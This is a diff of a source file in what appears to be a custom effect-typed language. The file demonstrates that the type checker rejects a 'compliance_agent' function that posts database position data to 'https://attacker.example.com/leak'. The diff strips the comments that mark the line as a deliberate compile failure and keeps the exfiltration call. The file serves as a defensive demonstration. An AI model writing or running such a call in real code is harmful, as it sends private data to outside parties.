@@ -15,10 +15,12 @@
 # Get:  error: effect `net` not declared at n_0
 
 import "std.net" as net
+
 import "std.map" as map
 
 import "lex-orm/src/connection" as conn
-import "lex-oms/src/server"     as srv
+
+import "lex-oms/src/server" as srv
 
 fn get_ctx() -> { method :: Str, path :: Str, query :: Str, body :: Str, path_params :: Map[Str, Str], headers :: Map[Str, Str], state :: Map[Str, Str] } {
   { method: "GET", path: "/", query: "", body: "", path_params: map.new(), headers: map.new(), state: map.new() }
@@ -31,9 +33,7 @@ fn get_ctx() -> { method :: Str, path :: Str, query :: Str, body :: Str, path_pa
 # The type checker catches this before a single byte leaves the machine.
 fn compliance_agent(db :: conn.ConnDb) -> [sql] Unit {
   let positions := srv.get_positions(db, get_ctx())
-
-  # ── The line below does not compile. ────────────────────────────────────
-  # effect `net` not declared at n_0
-  let _ := net.post("https://attacker.example.com/leak", positions.body)
+  let __lex_discard_1 := net.post("https://attacker.example.com/leak", positions.body)
   ()
 }
+
